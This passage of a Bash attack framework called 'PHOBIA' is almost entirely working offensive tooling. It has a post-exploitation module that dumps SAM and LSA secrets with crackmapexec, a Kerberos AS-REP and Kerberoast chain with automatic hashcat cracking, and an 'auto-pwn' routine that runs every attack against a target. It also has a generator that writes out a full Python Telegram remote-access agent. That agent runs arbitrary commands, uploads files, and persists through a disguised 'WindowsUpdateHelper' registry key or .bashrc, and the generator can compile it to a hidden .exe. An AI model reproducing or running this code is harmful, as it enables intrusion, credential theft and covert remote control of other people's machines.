    while true; do
        print_banner
        menu_header "C R E D   H A R V E S T E R"
        phb_row "  Passive credential capture on the LAN." "${DIM}${GREY}"
        phb_row "  Responder poisons LLMNR/NBT-NS/MDNS." "${DIM}${GREY}"
        phb_div
        local status="stopped"
        [ -f /tmp/n2_responder.pid ] && kill -0 "$(cat /tmp/n2_responder.pid 2>/dev/null)" 2>/dev/null && status="running"
        phb_row "  Status: $status" "$([ "$status" = "running" ] && echo "${BOLD}${GREEN}" || echo "${BOLD}${RED}")"
        phb_div
        n2_cred_harvest
        return
    done
}

# ===============================================================
# N1 — POST-EXPLOITATION KIT
# Runs after any shell lands. Auto-recon, SAM dump, persistence.
# ===============================================================

n1_post_exploit() {
    trap phobia_interrupt INT
    print_banner
    menu_header "P O S T - E X P L O I T A T I O N   K I T"

    phb_row "  Runs standard post-ex actions against a target." "${DIM}${GREY}"
    phb_row "  Requires admin creds on the target." "${DIM}${GREY}"
    phb_div
    read -p "$(echo -e ${YELLOW}'Target IP: '${NC})" TGT
    [ -z "$TGT" ] && return
    read -p "$(echo -e ${YELLOW}'Username: '${NC})" U
    read -sp "$(echo -e ${YELLOW}'Password: '${NC})" P; echo ""
    read -p "$(echo -e ${YELLOW}'Domain (or . for local): '${NC})" D
    [ -z "$D" ] && D="."

    local loot="$(_sess_dir)/loot/postex_${TGT}_$(date +%s)"
    mkdir -p "$loot"

    local CME
    command -v nxc >/dev/null 2>&1 && CME="nxc" || CME="crackmapexec"

    echo ""
    echo -e "${BOLD}${YELLOW}━━━ 1/6  System info ━━━${NC}"
    $CME smb "$TGT" -u "$U" -p "$P" -d "$D" -x "whoami /all" 2>&1 | tee "$loot/sysinfo.txt" | tail -20

    echo ""
    echo -e "${BOLD}${YELLOW}━━━ 2/6  Local users ━━━${NC}"
    $CME smb "$TGT" -u "$U" -p "$P" -d "$D" -x "net user" 2>&1 | tee "$loot/users.txt" | tail -15

    echo ""
    echo -e "${BOLD}${YELLOW}━━━ 3/6  Shares ━━━${NC}"
    $CME smb "$TGT" -u "$U" -p "$P" -d "$D" --shares 2>&1 | tee "$loot/shares.txt" | tail -15

    echo ""
    echo -e "${BOLD}${YELLOW}━━━ 4/6  SAM dump ━━━${NC}"
    $CME smb "$TGT" -u "$U" -p "$P" -d "$D" --sam 2>&1 | tee "$loot/sam.txt" | tail -20

    echo ""
    echo -e "${BOLD}${YELLOW}━━━ 5/6  LSA secrets ━━━${NC}"
    $CME smb "$TGT" -u "$U" -p "$P" -d "$D" --lsa 2>&1 | tee "$loot/lsa.txt" | tail -15

    echo ""
    echo -e "${BOLD}${YELLOW}━━━ 6/6  Persistence check ━━━${NC}"
    $CME smb "$TGT" -u "$U" -p "$P" -d "$D" -x "schtasks /query /fo LIST /v" 2>&1 | tee "$loot/schtasks.txt" | tail -20

    echo ""
    echo -e "${BOLD}${GREEN}━━━ LOOT SUMMARY ━━━${NC}"
    echo -e "  saved to: $loot"
    echo -e "  files:    $(find "$loot" -type f | wc -l)"
    echo ""

    # auto-import SAM hashes to vault
    if [ -s "$loot/sam.txt" ]; then
        while read -r line; do
            if echo "$line" | grep -qE '^[A-Za-z0-9_]+\:[0-9]+\:[a-fA-F0-9]{32}\:[a-fA-F0-9]{32}'; then
                local user hash
                user=$(echo "$line" | cut -d: -f1)
                hash=$(echo "$line" | cut -d: -f4)
                [ -n "$user" ] && [ -n "$hash" ] && \
                    _vault_add "postex-sam" "$TGT" "$user" "$hash" "SAM-NTLM" 2>/dev/null
            fi
        done < "$loot/sam.txt"
        echo -e "${GREEN}[+] SAM hashes added to vault${NC}"
        echo -e "${DIM}    run [25] Hashcat Auto to crack them${NC}"
    fi
    echo ""
    addon_wait
}

menu_post_exploit() {
    trap phobia_interrupt INT
    while true; do
        print_banner
        menu_header "P O S T - E X P L O I T A T I O N"
        phb_row "  [1]  Run full post-ex kit (needs creds)" "${BOLD}${GREEN}"
        phb_row "  [2]  Show past post-ex loot"           "${BOLD}${CYAN}"
        phb_div
        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) n1_post_exploit ;;
            2) find "$(_sess_dir)/loot" -maxdepth 1 -type d -name 'postex_*' 2>/dev/null | sort -r | head -10; addon_wait ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}


# ===============================================================
# N6 — KERBEROS CHAIN
# AS-REP roast → auto-crack → Kerberoast → auto-crack
# ===============================================================

n6_kerberos_chain() {
    trap phobia_interrupt INT
    print_banner
    menu_header "K E R B E R O S   C H A I N"

    phb_row "  Full Kerberos attack chain." "${DIM}${GREY}"
    phb_row "  1. AS-REP roast (no creds needed)" "${BOLD}${CYAN}"
    phb_row "  2. Auto hashcat crack" "${BOLD}${CYAN}"
    phb_row "  3. Kerberoast (needs any domain user)" "${BOLD}${CYAN}"
    phb_row "  4. Auto hashcat crack" "${BOLD}${CYAN}"
    phb_div
    read -p "$(echo -e ${YELLOW}'DC IP: '${NC})" DC
    [ -z "$DC" ] && return
    read -p "$(echo -e ${YELLOW}'Domain (e.g. lab.local): '${NC})" DOM
    [ -z "$DOM" ] && return

    local userlist=""
    local outdir="$(_sess_dir)/creds/kerb_${DOM}_$(date +%s)"
    mkdir -p "$outdir"

    # ---- 1. AS-REP roast ----
    print_banner
    menu_header "K E R B E R O S   C H A I N   —   A S - R E P"
    phb_row "  [1/4] AS-REP roasting (no creds)..." "${BOLD}${YELLOW}"
    phb_row "  need a userlist" "${DIM}${GREY}"
    menu_footer
    echo ""

    read -p "  userlist [${HOME}/top10k.txt or rockyou]: " UL
    [ -z "$UL" ] && UL="${HOME}/top10k.txt"
    [ ! -f "$UL" ] && UL="/usr/share/wordlists/rockyou.txt"
    [ ! -f "$UL" ] && { echo -e "${RED}[!] no userlist${NC}"; addon_wait; return; }

    local asrep_out="$outdir/asrep.txt"
    if command -v impacket-GetNPUsers >/dev/null 2>&1; then
        impacket-GetNPUsers "$DOM/" -dc-ip "$DC" -usersfile "$UL" -format hashcat -outputfile "$asrep_out" 2>&1 | tail -20
        echo ""
        local asrep_count
        asrep_count=$(grep -c '^\$krb5asrep\$' "$asrep_out" 2>/dev/null || echo 0)
        echo -e "${GREEN}[+] $asrep_count AS-REP hashes saved to $asrep_out${NC}"
    else
        echo -e "${RED}[!] impacket-GetNPUsers missing${NC}"
    fi
    echo ""

    # ---- 2. crack AS-REP ----
    if [ -s "$asrep_out" ] && [ "$(grep -c '^\$krb5asrep\$' "$asrep_out" 2>/dev/null)" -gt 0 ]; then
        print_banner
        menu_header "K E R B E R O S   C H A I N   —   C R A C K   A S - R E P"
        phb_row "  [2/4] Auto-cracking AS-REP hashes..." "${BOLD}${YELLOW}"
        menu_footer
        echo ""

        local wl
        for wl in /usr/share/wordlists/rockyou.txt "$HOME/top10k.txt" $WL_160M; do
            [ -f "$wl" ] || continue
            echo -e "${CYAN}[*] trying $wl${NC}"
            hashcat -m 18200 -a 0 "$asrep_out" "$wl" \
                --potfile-path="$outdir/.pot" \
                --outfile="$outdir/asrep_cracked.txt" \
                --outfile-format=2 \
                --quiet --optimized-kernel-enable 2>&1 | tail -2
            [ -s "$outdir/asrep_cracked.txt" ] && break
        done

        if [ -s "$outdir/asrep_cracked.txt" ]; then
            echo ""
            echo -e "${GREEN}[+] cracked AS-REP hashes:${NC}"
            while read -r line; do
                [ -z "$line" ] && continue
                echo -e "    ${BOLD}${LIME}$line${NC}"
                _vault_add "kerberos-asrep" "$DOM" "$(basename "$asrep_out")" "$line" "asrep-cracked" 2>/dev/null
            done < "$outdir/asrep_cracked.txt"
        fi
        echo ""
    fi

    # ---- 3. Kerberoast ----
    print_banner
    menu_header "K E R B E R O S   C H A I N   —   K E R B E R O A S T"
    phb_row "  [3/4] Kerberoasting (needs a domain user)..." "${BOLD}${YELLOW}"
    phb_row "  blank user = skip this step" "${DIM}${GREY}"
    menu_footer
    echo ""

    read -p "  domain user: " KU
    [ -z "$KU" ] && { echo -e "${DIM}    skipped${NC}"; addon_wait; return; }
    read -sp "  password: " KP; echo ""

    local kerb_out="$outdir/kerberoast.txt"
    impacket-GetUserSPNs "$DOM/$KU:$KP" -dc-ip "$DC" -request -outputfile "$kerb_out" 2>&1 | tail -20
    echo ""

    # ---- 4. crack Kerberoast ----
    if [ -s "$kerb_out" ] && [ "$(grep -c '^\$krb5tgs\$' "$kerb_out" 2>/dev/null)" -gt 0 ]; then
        print_banner
        menu_header "K E R B E R O S   C H A I N   —   C R A C K   K E R B E R O A S T"
        phb_row "  [4/4] Auto-cracking Kerberoast hashes..." "${BOLD}${YELLOW}"
        menu_footer
        echo ""

        for wl in /usr/share/wordlists/rockyou.txt "$HOME/top10k.txt" $WL_160M; do
            [ -f "$wl" ] || continue
            echo -e "${CYAN}[*] trying $wl${NC}"
            hashcat -m 13100 -a 0 "$kerb_out" "$wl" \
                --potfile-path="$outdir/.pot" \
                --outfile="$outdir/kerb_cracked.txt" \
                --outfile-format=2 \
                --quiet --optimized-kernel-enable 2>&1 | tail -2
            [ -s "$outdir/kerb_cracked.txt" ] && break
        done

        if [ -s "$outdir/kerb_cracked.txt" ]; then
            echo ""
            echo -e "${GREEN}[+] cracked Kerberoast hashes:${NC}"
            while read -r line; do
                [ -z "$line" ] && continue
                echo -e "    ${BOLD}${LIME}$line${NC}"
                _vault_add "kerberos-tgs" "$DOM" "$KU" "$line" "kerberoast-cracked" 2>/dev/null
            done < "$outdir/kerb_cracked.txt"
        fi
        echo ""
    fi

    print_banner
    menu_header "K E R B E R O S   C H A I N   —   D O N E"
    phb_row "  output dir: $outdir" "${BOLD}${CYAN}"
    phb_row "  asrep:      $(grep -c '^\$krb5asrep\$' "$asrep_out" 2>/dev/null || echo 0) hashes" "${BOLD}${CYAN}"
    phb_row "  kerberoast: $(grep -c '^\$krb5tgs\$' "$kerb_out" 2>/dev/null || echo 0) hashes" "${BOLD}${CYAN}"
    phb_row "  all cracked → vault" "${BOLD}${GREEN}"
    menu_footer
    addon_wait
}

menu_kerberos_chain() {
    trap phobia_interrupt INT
    while true; do
        print_banner
        menu_header "K E R B E R O S   C H A I N"
        phb_row "  AS-REP + Kerberoast + auto hashcat crack." "${DIM}${GREY}"
        phb_div
        phb_row "  [1]  Run full chain" "${BOLD}${GREEN}"
        phb_row "  [2]  List past kerberos loot" "${BOLD}${CYAN}"
        phb_div
        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) n6_kerberos_chain ;;
            2) find "$(_sess_dir)/creds" -maxdepth 1 -type d -name 'kerb_*' 2>/dev/null | sort -r | head -10; addon_wait ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

# ===============================================================
# N4 — TELEGRAM C2
# Generate a persistent python agent, serve it, listen on telegram
# ===============================================================

# path to the agent source
N4_AGENT_DIR="$BASE_DIR/n4_agents"
mkdir -p "$N4_AGENT_DIR" 2>/dev/null

# bot token + chat id (same bot as before)
# read token from env or phobia.env (gitignored)
if [ -f "$BASE_DIR/phobia.env" ]; then
    set -a
    . "$BASE_DIR/phobia.env"
    set +a
fi
N4_BOT_TOKEN="${PHOBIA_BOT_TOKEN:-}"
N4_CHAT_ID="${PHOBIA_CHAT_ID:-}"


n4_generate_agent() {
    trap phobia_interrupt INT
    print_banner
    menu_header "T E L E G R A M   C 2   —   A G E N T   B U I L D E R"

    phb_row "  Build a persistent telegram agent (python)." "${DIM}${GREY}"
    phb_row "  Agent polls the bot for commands and replies with output." "${DIM}${GREY}"
    phb_row "  Bot: $PHOBIA_BOT_NAME" "${BOLD}${CYAN}"
    phb_div
    phb_row "  [1]  Generate linux agent (.py)" "${BOLD}${GREEN}"
    phb_row "  [2]  Generate windows agent (.py)" "${BOLD}${GREEN}"
    phb_row "  [3]  Generate agent + compile to .exe (pyinstaller)" "${BOLD}${YELLOW}"
    phb_row "  [4]  Serve agents over HTTP" "${BOLD}${CYAN}"
    phb_row "  [5]  Show generated agents" "${BOLD}${CYAN}"
    phb_div
    phb_row "  [0]  Back" "${RED}"
    menu_footer
    read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C

    case "$C" in
        1|2|3)
            local plat="linux"
            [ "$C" = "2" ] || [ "$C" = "3" ] && plat="windows"

            local stamp; stamp=$(date +%s)
            local agent="$N4_AGENT_DIR/agent_${plat}_$stamp.py"
            local interval=5
            read -p "  poll interval seconds [5]: " pi
            [ -n "$pi" ] && interval="$pi"

            cat > "$agent" << AGENT_EOF
#!/usr/bin/env python3
# Telegram C2 agent — phobia v6
# platform: $plat
import os, sys, time, json, subprocess, urllib.request, urllib.parse
import platform, socket, base64, io

TOKEN = "$N4_BOT_TOKEN"
CHAT  = "$N4_CHAT_ID"
POLL  = $interval
API   = f"https://api.telegram.org/bot{TOKEN}"
PLATFORM = "$plat"

def send(text):
    try:
        d = urllib.parse.urlencode({"chat_id": CHAT, "text": str(text)[:4000]}).encode()
        urllib.request.urlopen(f"{API}/sendMessage", data=d, timeout=10)
    except Exception:
        pass

def send_file(path, caption=""):
    try:
        boundary = "----phobia"
        with open(path, "rb") as f:
            filedata = f.read()
        body = b""
        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT}\r\n'.encode()
        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n'.encode()
        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="document"; filename="{os.path.basename(path)}"\r\n'.encode()
        body += b"Content-Type: application/octet-stream\r\n\r\n"
        body += filedata + b"\r\n"
        body += f"--{boundary}--\r\n".encode()
        req = urllib.request.Request(f"{API}/sendDocument", data=body)
        req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
        urllib.request.urlopen(req, timeout=30)
    except Exception as e:
        send(f"[upload fail] {e}")

def run(cmd):
    try:
        if PLATFORM == "windows":
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        else:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        out = (r.stdout + r.stderr).strip() or "[no output]"
        return out
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return f"[error] {e}"

def sysinfo():
    try:
        ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        ip = "?"
    return (
        f"host: {socket.gethostname()}\n"
        f"user: {os.getenv('USERNAME') or os.getenv('USER')}\n"
        f"os:   {platform.system()} {platform.release()}\n"
        f"arch: {platform.machine()}\n"
        f"cwd:  {os.getcwd()}\n"
        f"ip:   {ip}\n"
    )

def shell_persist():
    # simple persistence — cron on linux, registry on windows
    try:
        exe = sys.executable
        script = os.path.abspath(__file__)
        if PLATFORM == "windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, path, 0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, "WindowsUpdateHelper", 0, winreg.REG_SZ,
                                  f'"{exe}" "{script}"')
            return "[+] persisted via HKCU Run"
        else:
            rc = os.path.expanduser("~/.bashrc")
            with open(rc, "a") as f:
                f.write(f"\nnohup {exe} {script} >/dev/null 2>&1 &\n")
            return "[+] persisted via .bashrc"
    except Exception as e:
        return f"[persist fail] {e}"

def main():
    send(f"[+] agent online ({PLATFORM}) — {socket.gethostname()}\n{sysinfo()}")
    off = 0
    while True:
        try:
            with urllib.request.urlopen(f"{API}/getUpdates?timeout=20&offset={off}", timeout=25) as r:
                data = json.loads(r.read())
        except Exception:
            time.sleep(POLL)
            continue

        for u in data.get("result", []):
            off = u["update_id"] + 1
            m = u.get("message", {})
            t = m.get("text", "")
            c = str(m.get("chat", {}).get("id", ""))
            if c != str(CHAT) or not t:
                continue

            if t == "/sysinfo":
                send(sysinfo()); continue
            if t == "/persist":
                send(shell_persist()); continue
            if t == "/exit":
                send("[*] agent shutting down"); sys.exit(0)
            if t == "/help":
                send("/sysinfo  /persist  /exit  /download <path>  /cd <path>  /help\nanything else = shell command")
                continue
            if t.startswith("/download "):
                p = t[10:].strip()
                if os.path.exists(p): send_file(p, f"download: {p}")
                else: send(f"[not found] {p}")
                continue
            if t.startswith("/cd "):
                try:
                    os.chdir(t[4:].strip()); send(f"cwd: {os.getcwd()}")
                except Exception as e: send(f"[cd err] {e}")
                continue
            if t == "/cd":
                send(os.getcwd()); continue

            send(f"$ {t}")
            send(run(t))
        time.sleep(POLL)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: pass
AGENT_EOF

            chmod +x "$agent"
            echo ""
            echo -e "${GREEN}[+] agent written: $agent${NC}"
            echo -e "${DIM}    size: $(wc -l < "$agent") lines, $(du -h "$agent" | awk '{print $1}')${NC}"

            if [ "$C" = "3" ]; then
                echo ""
                echo -e "${CYAN}[*] compiling to exe with pyinstaller...${NC}"
                if command -v pyinstaller >/dev/null 2>&1; then
                    ( cd "$N4_AGENT_DIR" && pyinstaller --onefile --noconsole --name "agent_${stamp}" "$agent" 2>&1 | tail -5 )
                    echo -e "${GREEN}[+] exe: $N4_AGENT_DIR/dist/agent_${stamp}.exe${NC}"
                else
                    echo -e "${YELLOW}[!] pyinstaller not installed. install with: pip3 install pyinstaller${NC}"
                fi
            fi

            echo ""
            addon_wait ;;
        4)
            print_banner
            menu_header "T E L E G R A M   C 2   —   S E R V E"
            phb_row "  Serving $N4_AGENT_DIR on :8080" "${BOLD}${CYAN}"
            phb_row "  Ctrl+C to stop" "${DIM}${GREY}"
            menu_footer
            echo ""
            cd "$N4_AGENT_DIR" && python3 -m http.server 8080 --bind 0.0.0.0
            ;;
        5)
            print_banner
            menu_header "T E L E G R A M   C 2   —   A G E N T S"
            local found=0
            while read -r f; do
                [ -z "$f" ] && continue
                found=1
                local n; n=$(basename "$f")
                local sz; sz=$(du -h "$f" | awk '{print $1}')
                phb_row "  $n  ($sz)" "${BOLD}${GREEN}"
            done < <(find "$N4_AGENT_DIR" -maxdepth 1 -type f -name 'agent_*' 2>/dev/null | sort)
            [ $found -eq 0 ] && phb_row "  no agents yet" "${DIM}${GREY}"
            menu_footer
            addon_wait ;;
        0) return ;;
    esac
}

# listen for incoming messages — a "phone view" from the terminal
n4_listen() {
    trap phobia_interrupt INT
    print_banner
    menu_header "T E L E G R A M   C 2   —   L I V E   T A P"
    phb_row "  Polling @<your-bot> for new messages." "${DIM}${GREY}"
    phb_row "  Ctrl+C to stop." "${DIM}${GREY}"
    menu_footer
    echo ""

    local off=0
    local API="https://api.telegram.org/bot$N4_BOT_TOKEN"
    while true; do
        local json
        json=$(curl -s --max-time 25 "$API/getUpdates?timeout=20&offset=$off" 2>/dev/null)
        [ -z "$json" ] && { sleep 3; continue; }

        # extract update_ids and text
        echo "$json" | python3 -c "
import sys, json
d = json.load(sys.stdin)
for u in d.get('result', []):
    mid = u['update_id']
    m = u.get('message', {})
    t = m.get('text', '')
    c = m.get('chat', {}).get('first_name', '?')
    if t:
        print(f\"{mid}|{c}|{t}\")
" 2>/dev/null | while IFS='|' read -r mid name txt; do
            [ -z "$mid" ] && continue
            echo -e "${BOLD}${GREEN}[$name]${NC} $txt"
            off=$((mid + 1))
        done

        sleep 2
    done
}

menu_telegram_c2() {
    trap phobia_interrupt INT
    while true; do
        print_banner
        menu_header "T E L E G R A M   C 2"
        phb_row "  Bot: $PHOBIA_BOT_NAME" "${BOLD}${CYAN}"
        phb_row "  Chat ID: $N4_CHAT_ID" "${DIM}${GREY}"
        phb_div
        phb_row "  [1]  Build agent (linux/windows/exe)" "${BOLD}${GREEN}"
        phb_row "  [2]  Serve agents over HTTP :8080"    "${BOLD}${CYAN}"
        phb_row "  [3]  Live tap (watch chat in terminal)" "${BOLD}${MAGENTA}"
        phb_row "  [4]  Show generated agents"           "${BOLD}${CYAN}"
        phb_div
        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) n4_generate_agent ;;
            2) n4_generate_agent ;;   # serves from within that menu (option 4)
            3) n4_listen ;;
            4) n4_generate_agent ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}


# ===============================================================
# N7 — AUTO-PWN
# One target. All HIGH+MEDIUM attacks. Auto-crack. Auto-loot.
# ===============================================================

n7_auto_pwn() {
    trap phobia_interrupt INT
    print_banner
    menu_header "A U T O - P W N"

    phb_row "  Point at one target. Runs every viable attack." "${BOLD}${RED}"
    phb_row "  Auto-cracks hashes. Auto-vaults credentials. Auto-reports." "${DIM}${GREY}"
    phb_div
    phb_row "  Use only on hosts you own or have written permission to test." "${YELLOW}"
    phb_div
    menu_footer
    echo ""

    if ! lan_pick_target "AUTO-PWN TARGET"; then return; fi
    local target="$LAN_TARGET_IP"

    local sesslog="$(_sess_dir)/scans/autopwn_${target}_$(date +%s).log"
    mkdir -p "$(dirname "$sesslog")"

    echo -e "${BOLD}${RED}════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${RED}  AUTO-PWN ENGAGED: $target${NC}"
    echo -e "${BOLD}${RED}  log: $sesslog${NC}"
    echo -e "${BOLD}${RED}════════════════════════════════════════════════${NC}"
    echo ""

    # ---- 1. full port scan ----
    echo -e "${CYAN}[1/5] full port scan (-p-)...${NC}" | tee -a "$sesslog"
    local ports
    ports=$(sudo nmap -Pn -T4 -p- --min-rate=2000 "$target" 2>/dev/null \
        | awk '/^[0-9]+\/tcp/ && /open/ {gsub("/tcp","",$1); print $1}' | tr '\n' ' ')
    ports="${ports% }"
    echo -e "${GREEN}[+] open ports: $ports${NC}" | tee -a "$sesslog"
    echo ""

    if [ -z "$ports" ]; then
        echo -e "${RED}[!] no open ports — aborting${NC}"
        addon_wait
        return
    fi

    # ---- 2. service + version scan ----
    echo -e "${CYAN}[2/5] service scan (-sV)...${NC}" | tee -a "$sesslog"
    sudo nmap -Pn -sV -p "$ports" "$target" 2>&1 | tee -a "$sesslog" | tail -20
    echo ""

    # ---- 3. build plan ----
    echo -e "${CYAN}[3/5] building attack plan...${NC}" | tee -a "$sesslog"
    local plan
    plan=$(_p6_plan "$target" "$ports")
    echo "$plan" | tee -a "$sesslog"
    echo ""

    # ---- 4. auto-run every HIGH + MEDIUM attack ----
    echo -e "${CYAN}[4/5] running all HIGH + MEDIUM attacks...${NC}" | tee -a "$sesslog"
    echo ""
    while IFS='|' read -r port key desc conf; do
        [ -z "$key" ] && continue
        [ "$conf" = "LOW" ] && continue
        echo "" | tee -a "$sesslog"
        echo -e "${BOLD}${MAGENTA}━━━ $desc (port $port, $conf) ━━━${NC}" | tee -a "$sesslog"
        _p6_run "$target" "$key" 2>&1 | tee -a "$sesslog"
        sleep 1
    done <<< "$plan"

    # ---- 5. auto-crack anything in the vault from this target ----
    echo "" | tee -a "$sesslog"
    echo -e "${CYAN}[5/5] auto-cracking vault hashes...${NC}" | tee -a "$sesslog"
    echo ""

    if [ -f "$VAULT_DB" ]; then
        local before
        before=$(sqlite3 "$VAULT_DB" "SELECT COUNT(*) FROM creds WHERE target='$target' AND length(password)>=16;" 2>/dev/null || echo 0)

        # write new hashes to temp
        local hf="$(_sess_dir)/creds/autopwn_hashes_$(date +%s).txt"
        mkdir -p "$(dirname "$hf")"
        sqlite3 "$VAULT_DB" "SELECT password FROM creds WHERE target='$target' AND length(password)>=16;" 2>/dev/null > "$hf"

        local n
        n=$(wc -l < "$hf" 2>/dev/null || echo 0)

        if [ "$n" -gt 0 ]; then
            echo -e "${GREEN}[+] $n hashes from $target → running hashcat${NC}"
            for wl in /usr/share/wordlists/rockyou.txt "$HOME/top10k.txt" $WL_160M; do
                [ -f "$wl" ] || continue
                for mode in 5600 1000 18200 13100 22000; do
                    hashcat -m "$mode" -a 0 "$hf" "$wl" \
                        --potfile-path="$(_sess_dir)/creds/n8.potfile" \
                        --outfile="$hf.cracked" \
                        --outfile-format=2 \
                        --quiet --optimized-kernel-enable 2>&1 | tail -1
                done
            done

            if [ -s "$hf.cracked" ]; then
                sort -u "$hf.cracked" -o "$hf.cracked"
                echo -e "${GREEN}[+] cracked:${NC}"
                while read -r line; do
                    [ -z "$line" ] && continue
                    echo -e "    ${BOLD}${LIME}$line${NC}"
                    _vault_add "autopwn-hashcat" "$target" "autopwn" "$line" "auto-cracked" 2>/dev/null
                done < "$hf.cracked"
            fi
        else
            echo -e "${DIM}    no hashes for this target in vault${NC}"
        fi
    fi

    # ---- summary ----
    echo ""
    echo -e "${BOLD}${GREEN}════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${GREEN}  AUTO-PWN COMPLETE: $target${NC}"
    echo -e "${BOLD}${GREEN}════════════════════════════════════════════════${NC}"
    echo -e "  full log:      $sesslog"

    if [ -f "$VAULT_DB" ]; then
        local cred_count
        cred_count=$(sqlite3 "$VAULT_DB" "SELECT COUNT(*) FROM creds WHERE target='$target';" 2>/dev/null || echo 0)
        echo -e "  creds in vault: $cred_count"
    fi

    echo ""
    echo -e "${DIM}  next: [19] Report to generate HTML summary${NC}"
    echo ""
    addon_wait
}

menu_auto_pwn() {
    trap phobia_interrupt INT
    while true; do
        print_banner
        menu_header "A U T O - P W N"
        phb_row "  Full attack chain against ONE target." "${BOLD}${RED}"
        phb_row "  Port scan → service scan → all attacks → auto-crack." "${DIM}${GREY}"
        phb_div
        phb_row "  Use only on your own hosts." "${YELLOW}"
        phb_div
        phb_row "  [1]  Run auto-pwn" "${BOLD}${RED}"
        phb_row "  [2]  List previous auto-pwn logs" "${BOLD}${CYAN}"
        phb_div
        phb_row "  [0]  Back" "${RED}"
        menu_footer
        read -p "$(echo -e ${YELLOW}'Choice: '${NC})" C
        case "$C" in
            1) n7_auto_pwn ;;
            2) find "$(_sess_dir)/scans" -maxdepth 1 -name 'autopwn_*' 2>/dev/null | sort -r | head -10; addon_wait ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}


# ===============================================================
# ROUTING FIX — stub menus for any option that wasn't wired
# ===============================================================

# wrapper for menu_hashcat_auto — already defined but ensure it's callable
if ! declare -f menu_hashcat_auto >/dev/null; then
menu_hashcat_auto() {
    print_banner; menu_header "H A S H C A T   A U T O"
    phb_row "  module not loaded — check install" "${BOLD}${RED}"
    menu_footer; addon_wait
}
fi

if ! declare -f menu_page_cloner >/dev/null; then
menu_page_cloner() {
    print_banner; menu_header "P A G E   C L O N E R"
    phb_row "  module not loaded — check install" "${BOLD}${RED}"
    menu_footer; addon_wait
}
fi

if ! declare -f menu_archive_cracker >/dev/null; then
menu_archive_cracker() {
    print_banner; menu_header "A R C H I V E   C R A C K E R"
    phb_row "  module not loaded — check install" "${BOLD}${RED}"
    menu_footer; addon_wait
}
fi

if ! declare -f menu_smb_crawler >/dev/null; then
menu_smb_crawler() {
    print_banner; menu_header "S M B   C R A W L E R"
    phb_row "  module not loaded — check install" "${BOLD}${RED}"
    menu_footer; addon_wait
}
fi

if ! declare -f menu_cred_harvester >/dev/null; then
menu_cred_harvester() {
    print_banner; menu_header "C R E D   H A R V E S T E R"
    phb_row "  module not loaded — check install" "${BOLD}${RED}"
    menu_footer; addon_wait
}
fi

if ! declare -f menu_kerberos_chain >/dev/null; then
menu_kerberos_chain() {
    print_banner; menu_header "K E R B E R O S   C H A I N"
    phb_row "  module not loaded — check install" "${BOLD}${RED}"
    menu_footer; addon_wait
}
fi

if ! declare -f menu_telegram_c2 >/dev/null; then
menu_telegram_c2() {
    print_banner; menu_header "T E L E G R A M   C 2"
    phb_row "  module not loaded — check install" "${BOLD}${RED}"
    menu_footer; addon_wait
}
fi

if ! declare -f menu_post_exploit >/dev/null; then
menu_post_exploit() {
    print_banner; menu_header "P O S T - E X P L O I T"
    phb_row "  module not loaded — check install" "${BOLD}${RED}"
    menu_footer; addon_wait
}
fi

if ! declare -f menu_auto_pwn >/dev/null; then
menu_auto_pwn() {
    print_banner; menu_header "A U T O - P W N"
    phb_row "  module not loaded — check install" "${BOLD}${RED}"
    menu_footer; addon_wait
}
fi

# ===============================================================
# N10 — DETAILED HELP
# ===============================================================
_phobia_help() {
    trap phobia_interrupt INT
    while true; do
        print_banner
        menu_header "H E L P   /   D O C U M E N T A T I O N"

        phb_row "  PHOBIA — the all-in-one network attack framework" "${BOLD}${MAGENTA}"
        phb_row "  Created by @zeruaep — v1.0.0" "${DIM}${GREY}"
        phb_div

        phb_row "  ── QUICK START ──" "${BOLD}${GREEN}"
        phb_row "    1. scan: [4] Local Network → [1] What's on my Wi-Fi" "${DIM}${GREY}"
        phb_row "    2. pick a target IP from the list" "${DIM}${GREY}"
        phb_row "    3. attack: [4] → [3] Attack a device, or [17] AUTO-PWN" "${DIM}${GREY}"
        phb_row "    4. wait for output, then check [19] Report" "${DIM}${GREY}"
        phb_div

        phb_row "  ── MENU MAP ──" "${BOLD}${CYAN}"
        phb_row "    WIRELESS:   [1] WiFi   [2] BT   [3] Ext (KARMA,WPA3,SDR)" "${DIM}${GREY}"
        phb_row "    NETWORK:    [4] LAN    [5] AD   [6] Internal (MSF)" "${DIM}${GREY}"
        phb_row "    WEB:        [7] Web/DoS   [8] Cloud   [9] Tunnels" "${DIM}${GREY}"
        phb_row "    OPSEC:      [10] Maps  [11] Tor  [12] Tunnel  [13] Pages" "${DIM}${GREY}"
        phb_row "    TOOLS:      [14] PyPhisher  [15] OSINT  [16] MSF  [20] Update" "${DIM}${GREY}"
        phb_row "    FRAMEWORK:  [17] AUTO-PWN  [18] Sessions  [19] Report  [21] Post-Ex" "${DIM}${GREY}"
        phb_row "    TOOLKIT:    [22] Telegram C2  [23] Hashcat Auto  [28] Kerberos" "${DIM}${GREY}"
